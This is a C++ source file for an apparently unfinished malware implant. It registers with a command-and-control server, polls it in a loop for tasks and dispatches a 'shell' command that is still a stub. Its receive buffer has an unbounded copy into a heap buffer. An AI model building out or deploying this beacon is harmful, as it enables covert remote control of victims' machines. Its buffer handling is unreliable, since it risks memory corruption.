// @TODO: implant
#include "config.h"
#include "debug.h"
#include "json.hpp"
#include <cstdio>
#include <cstring>
#include <netdb.h>
#include <stdlib.h>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

using json = nlohmann::json;

void show_json_demo() {

  json out;
  out["foobar"] = 13;
  DEBUG_PRINTF("json: %s", out.dump().c_str());
  char val[] = "{\"foo\":123}";
  json data = json::parse(val);

  DEBUG_PRINTF("json: %s", data.dump().c_str());
}

char *round_trip(char *host, char *port, char *path, json body) {

  /*
   *
   * *
GET /admin/session/list HTTP/1.1
Host: localhost:5000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept:
*Connection : keep - alive /

                             "Content-Type: application/json\r\n"
                             "Content-Length: %d \r\n"
*/
  const char http_format[] = "POST %s HTTP/1.1\r\n"
                             "Host: %s\r\n"
                             "User-Agent: ch0nky\r\n"
                             "Connection: keep-alive\r\n"
                             "Content-Length: %lu \r\n"
                             "Content-Type: application/json\r\n\r\n"
                             "%s";
  int sock_fd = -1;
  struct addrinfo hints, *res, *p;
  int status = -1;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  status = getaddrinfo(host, port, &hints, &res);

  if (status != 0) {
    DEBUG_PRINTF("failed to resolve %s:%s: \n", host, port);
    return NULL;
  }
  // try all IPV4  results
  for (p = res; p != NULL; p = p->ai_next) {
    sock_fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
    if (sock_fd == -1) {
      perror("socket");
      continue;
    }
    status = connect(sock_fd, p->ai_addr, p->ai_addrlen);
    if (status == -1) {
      perror("connect");
      close(sock_fd);
      sock_fd = -1;
      continue;
    }
    // connected ok
    break;
  }
  freeaddrinfo(res);
  if (p == NULL) {
    DEBUG_PRINTF("failed to connect to server\n");
    //  freeaddrinfo(res);
    return NULL;
  }
  // we connected ok!
  // TODO: handle body, and post request
  auto dump = body.dump();
  DEBUG_PRINTF("JSON body: %s", dump.c_str());
  size_t req_size =
      sizeof(http_format) + strlen(host) + strlen(path) + strlen(dump.c_str());
  char *req_buffer = (char *)malloc(req_size + 1);
  // TODO: use snprintf twice to figure out actual size

  sprintf(req_buffer, http_format, path, host, strlen(dump.c_str()),
          dump.c_str());
  DEBUG_PRINTF("HTTP Request:\n%s\n", req_buffer);
  // TODO: request might get truncated here
  DEBUG_PRINTF("Payload size: %llu", strlen(req_buffer));
  ssize_t sent_bytes = send(sock_fd, req_buffer, strlen(req_buffer), 0);
  // @TODO: Lazy: assume maximum response size is 4096 * 4096
  // // TODO: be less alzy and use realloc
  char *out_buff = (char *)malloc(4096 * 4096);
  char buffer[4096] = {0};
  // read response
  ssize_t bytes_recv = 0;
  ssize_t total_recv = 0;
  // TODO: heap overwrite fix
  while ((bytes_recv = recv(sock_fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
    if (bytes_recv == -1) {
      perror("recv");
      free(out_buff);
      close(sock_fd);
      return NULL;
    }
    // buffer[bytes_recv] = '\0';
    memcpy(out_buff + total_recv, buffer, bytes_recv);
    total_recv += bytes_recv;
  }

  close(sock_fd);
  out_buff[total_recv] = '\0';
  DEBUG_PRINTF("%s", out_buff);

  return out_buff;
}
// dummy cmmmdn
char *fake_shell() {
  const char out[] = "i am so stealthy";
  char *result = (char *)malloc(sizeof(out));
  memcpy(result, out, sizeof(out));
  return result;
}
int handle_task(json chk_data, json &out) {
  DEBUG_PRINTF("Calling handle task\n");
  if (chk_data.is_null()) {
    DEBUG_PRINTF("chk_data is null no task to do\n");
    return -1;
  }
  DEBUG_PRINTF("Calling handle task\n");
  std::string cmd = chk_data["cmd"].get<std::string>();
  // TODO: use hash like djb to not do lots and lots of strcmp
  if (strcmp("shell", cmd.c_str()) == 0) {
    out["id"] = chk_data["id"];
    out["result"] = "woah shell";
    out["status"] = "ok";
    DEBUG_PRINTF("TASK_OUT: %s\n", out.dump().c_str());

    DEBUG_PRINTF("YAY i am a happy pandas\n");
    return 0;
  }
  DEBUG_PRINTF("There was data. but we didnt find it %s\n ",
               chk_data.dump().c_str());
  return -2;
}

int main() {
  DEBUG_PRINTF("Starting implant...\n");
  json req_body;
  req_body["password"] = "we_<3_ghost";

  char *out = round_trip(C2_HOST, C2_PORT, REGISTER_URI, req_body);
  char *body = strstr(out, "\r\n\r\n");
  json reg_data = json::parse(body);
  size_t session_id = reg_data["id"].get<size_t>();
#ifdef DEBUG
  session_id = 1;
  DEBUG_PRINTF("Warninig: hardcoded sesssion id");
#endif
  // TODO: handle errors
  DEBUG_PRINTF("body: %s\n, id: %lu", reg_data.dump().c_str(), session_id);
  free(out);
  // checkin loop
  char checkin_uri[4096] = {0};
  sprintf(checkin_uri, "%s/%lu", CHECKIN_URI, session_id);
  json task_out = json::object();
  while (1) {
    sleep(4);
    json resp_data;
    DEBUG_PRINTF("TASK_OUT: %s\n", task_out.dump().c_str());
    char *chck_out = round_trip(C2_HOST, C2_PORT, checkin_uri, task_out);
    // check if body is null or if the payload is null
    // if null we sad
    char *chk_body = strstr(chck_out, "\r\n\r\n");
    DEBUG_PRINTF("ck body: %s\n", chk_body);

    json checkin_resp_data = json::parse(chk_body);
    task_out.clear();
    int status = handle_task(checkin_resp_data, task_out);
    DEBUG_PRINTF("TASK_OUT: %s\n", task_out.dump().c_str());
    DEBUG_PRINTF("Calling free\n");
    free(chck_out);
  }
  DEBUG_PRINTF("Implant shutting down...\n");
  return 0;
}
